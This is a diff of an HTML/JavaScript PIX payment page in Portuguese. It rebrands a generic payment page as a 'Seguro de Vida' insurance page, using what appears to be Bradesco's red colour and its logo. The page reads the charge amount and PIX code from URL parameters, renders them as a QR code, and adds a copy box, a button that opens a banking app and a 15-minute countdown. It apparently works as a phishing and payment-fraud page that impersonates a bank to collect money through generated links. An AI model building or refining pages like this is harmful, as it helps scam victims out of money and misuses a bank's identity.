@@ -2,7 +2,7 @@
 <html lang="pt-br">
 <head>
 <meta charset="UTF-8">
-<title>Pagamento Seguro</title>
+<title>Seguro de Vida - Pagamento</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <style>
@@ -13,11 +13,16 @@ body {
 }
 
 .header {
-    background: #00a650;
+    background: #cc092f;
     color: white;
     text-align: center;
     padding: 15px;
-    font-size: 20px;
+    font-size: 18px;
+}
+
+.logo {
+    width: 120px;
+    margin-bottom: 10px;
 }
 
 .container {
@@ -31,7 +36,7 @@ body {
 
 .valor {
     font-size: 30px;
-    color: #00a650;
+    color: #cc092f;
     font-weight: bold;
 }
 
@@ -50,9 +55,17 @@ button {
     margin-top: 10px;
     border: none;
     border-radius: 10px;
-    background: #00a650;
+    background: #cc092f;
     color: white;
     cursor: pointer;
+}
+
+textarea {
+    width: 100%;
+    margin-top: 10px;
+    padding: 10px;
+    border-radius: 10px;
+    border: 1px solid #ccc;
 }
 
 input {
@@ -69,17 +82,25 @@ input {
 
 <body>
 
-<div class="header">Pagamento Seguro</div>
+<div class="header">Seguro de Vida</div>
 
 <!-- CLIENTE -->
 <div class="container" id="cliente">
-    <h2>Pagar com PIX</h2>
+
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Bradesco_logo.png" class="logo">
+
+    <h3>Plano de Seguro de Vida</h3>
+
     <div class="valor" id="valor">R$ 0,00</div>
-    <p id="descricao">Aguardando cobrança...</p>
+    <p id="descricao">Proteção para você e sua família</p>
 
     <div id="qr"></div>
 
     <button onclick="copiar()">Copiar código PIX</button>
+
+    <textarea id="codigoPix" readonly></textarea>
+
+    <button onclick="abrirBanco()">Abrir no app do banco</button>
 
     <div class="status" id="status">Aguardando pagamento</div>
     <div class="timer" id="timer"></div>
@@ -151,14 +172,24 @@ function gerar() {
     document.getElementById("linkGerado").innerText = link;
 }
 
-// copiar pix
+// copiar
 function copiar() {
-    if (!window.codigoPix) return;
     navigator.clipboard.writeText(window.codigoPix);
     alert("Código PIX copiado!");
 }
 
-// carregar dados do link
+// abrir banco
+function abrirBanco() {
+    if (!window.codigoPix) return;
+
+    window.location.href = "pix://" + window.codigoPix;
+
+    setTimeout(() => {
+        alert("Se não abrir, copie o código PIX e pague no seu banco.");
+    }, 1500);
+}
+
+// carregar dados
 function carregar() {
     let params = new URLSearchParams(window.location.search);
 
@@ -176,6 +207,8 @@ function carregar() {
 
     window.codigoPix = codigo;
 
+    document.getElementById("codigoPix").value = codigo;
+
     new QRCode(document.getElementById("qr"), {
         text: codigo,
         width: 200,
@@ -185,7 +218,7 @@ function carregar() {
     iniciarTimer();
 }
 
-// timer 15 min
+// timer
 function iniciarTimer() {
     let tempoTotal = 15 * 60;
     let inicio = Date.now();
@@ -209,7 +242,6 @@ function iniciarTimer() {
     }, 1000);
 }
 
-// iniciar
 carregar();
 </script>
 
